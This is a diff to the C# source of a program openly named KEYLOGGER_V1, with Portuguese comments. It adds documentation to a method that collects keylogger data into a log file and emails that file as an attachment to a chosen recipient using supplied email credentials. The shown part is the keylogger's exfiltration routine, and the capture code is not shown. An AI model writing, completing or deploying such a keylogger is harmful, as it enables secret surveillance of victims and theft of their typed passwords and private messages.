@@ -14,6 +14,9 @@ namespace KEYLOGGER_V1
     {
 
         #region Construtor
+        /// <summary>
+        ///  Construtor padrão de gravação
+        /// </summary>
         public Gravacao()
         {
 
@@ -22,15 +25,26 @@ namespace KEYLOGGER_V1
 
         #region Metodos
         #region metodos de Armazenamentos
+        /// <summary>
+        ///  Metodo de armazenar dados recolhidos pelo key
+        /// </summary>
+        /// <param name="login">Email de envio </param>
+        /// <param name="senha">Senha de envio </param>
+        /// <param name="conteudo">Conteudo de envio do corpo do email</param>
+        /// <param name="remetente">Email de quem esta enviando</param>
+        /// <param name="destinatario">Para quem esta enviando o email</param>
+        /// <param name="assunto">O assunto do email</param>
+        /// <param name="nomeArquivo">Nome do arquivo de log</param>
+        /// <param name="dirLog"> Caminho de onde será armazenado o log </param>
         public void Armazenar(string login, string senha, string conteudo, string remetente, string destinatario, string assunto, string nomeArquivo, string dirLog)
         {
 
             #region Enviar email com Anexo
-
+            
             LogServico logRecursos = new LogServico(dirLog);
             if (logRecursos.Contem())
             {
-                //Envia log se ouver
+                
                 EmailServico emailAnexo = new EmailServico(login, senha, remetente, destinatario, assunto, conteudo, dirLog);
                 if (!emailAnexo.EnviarAnexo())
                 {
